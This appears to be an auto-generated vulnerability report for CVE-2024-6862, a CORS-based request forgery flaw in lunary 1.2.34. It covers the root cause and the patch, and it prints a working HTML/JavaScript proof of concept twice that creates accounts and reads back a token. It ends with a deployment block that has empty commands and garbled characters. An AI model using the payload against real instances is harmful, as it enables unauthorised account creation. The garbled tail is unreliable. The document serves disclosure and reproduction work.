"# CVE-2024-6862 Detailed Report\n\n## Summary\nCVE-2024-6862 is a Cross-Site Request Forgery (CSRF) vulnerability identified in the lunary-ai/lunary software, specifically affecting version 1.2.34. The vulnerability arises from overly permissive Cross-Origin Resource Sharing (CORS) settings that allow unauthenticated endpoints to be exploited. This flaw enables an attacker to create user accounts and projects on the lunary instance as if they were legitimate users, particularly when the instance is hosted locally on personal machines that are not publicly accessible.\n\n## Root Cause of the Vulnerability\nThe root cause of the vulnerability lies in the CORS configuration of the lunary backend. The original CORS settings allowed any origin to access the backend endpoints, which is a significant security risk. The relevant code snippet from the advisory shows that the CORS settings were configured to accept any origin:\n\n```javascript\nctx.set(\"Access-Control-Allow-Origin\", ctx.get(\"Origin\") || \"*\")\n```\n\nThis line effectively permits all origins to make requests to the backend, which is particularly dangerous for endpoints that do not require authentication. As a result, an attacker could craft a malicious request from a different origin, leading to CSRF attacks.\n\nThe patch introduced in version 1.4.10 modifies this behavior by restricting the allowed origins based on the environment. In production, it uses a specific application URL instead of allowing all origins:\n\n```javascript\nconst origin =\n  process.env.NODE_ENV !== \"production\"\n    ? ctx.get(\"Origin\") || \"*\"\n    : process.env.APP_URL!;\n```\n\nThis change ensures that only requests from the specified application URL are accepted in production, mitigating the CSRF risk.\n\n## Exploitation Details\nTo exploit this vulnerability, an attacker would need to host a malicious script that sends a POST request to the vulnerable signup endpoint of the lunary instance. The attacker would typically host this script on a web server and trick a user into executing it in their browser while they are authenticated to the lunary instance.\n\n### Steps to Exploit:\n1. Host the following payload on a web server:\n   ```html\n   <script>\n       const req = new XMLHttpRequest();\n       req.onreadystatechange = function () {\n           if (req.readyState == XMLHttpRequest.DONE) {\n               console.log(JSON.parse(req.response).token);\n           }\n       }\n       \n       req.open(\"POST\", \"http://localhost:3333/auth/signup\");\n       req.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\n       req.send(JSON.stringify({\n           \"email\": \"somemail@a.com\",\n           \"password\": \"somepassword\",\n           \"name\": \"somename\",\n           \"projectName\": \"Project #1\",\n           \"orgName\": \"someone's Org\",\n           \"employeeCount\": \"6-49\",\n           \"whereFindUs\": \"hackernews\",\n           \"signupMethod\": \"signup\"\n       }));\n   </script>\n   ```\n2. The user must visit the attacker's web page while being logged into their lunary instance.\n3. The script will execute and send a request to the vulnerable endpoint, potentially creating a new user account and returning an authentication token.\n\n## Environment Setup Requirements\n- **Port**: 3333\n- **Target Endpoint**: `/auth/signup`\n- **Explicit Configuration**: None explicitly mentioned, but the backend should be running locally.\n\n## Complete PoC Code\n```html\n<script>\n    const req = new XMLHttpRequest();\n        req.onreadystatechange = function () {\n        if (req.readyState == XMLHttpRequest.DONE) {\n            console.log(JSON.parse(req.response).token);\n        }\n    }\n    \n    req.open(\"POST\", \"http://localhost:3333/auth/signup\");\n    req.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\n    req.send(JSON.stringify({\n        \"email\": \"somemail@a.com\",\n        \"password\": \"somepassword\",\n        \"name\": \"somename\",\n        \"projectName\": \"Project #1\",\n        \"orgName\": \"someone's Org\",\n        \"employeeCount\": \"6-49\",\n        \"whereFindUs\": \"hackernews\",\n        \"signupMethod\": \"signup\"\n    }));\n</script>\n```\n\nThis report outlines the critical aspects of CVE-2024-6862, including its nature, root cause, exploitation method, and necessary environment setup for reproducing the vulnerability.\n\n## üöÄ DEPLOYMENT STRATEGY (USE THIS - DO NOT GUESS!)\n\n**Repository URL**: https://github.com/lunary-ai/lunary\n**Platform**: N/A\n**Language**: None\n**Build Tool**: None\n\n### Build Commands:\n```bash\n\n```\n\n### Start Commands:\n```bash\n\n```\n\n### Deployment Notes:\n‰ªé GitHub Ê∫êÁ†ÅÈÉ®ÁΩ≤„ÄÇËØ≠Ë®Ä: Êú™Áü•, ÊûÑÂª∫Â∑•ÂÖ∑: Êú™Áü•\n\n‚ö†Ô∏è **CRITICAL INSTRUCTIONS**:\n1. DO NOT try to find Docker images or guess repository URLs\n2. USE THE REPOSITORY URL PROVIDED ABOVE\n3. Clone from the specified repository and follow build/start commands\n4. If build commands fail, analyze error and adapt (but keep using the same repo)\n"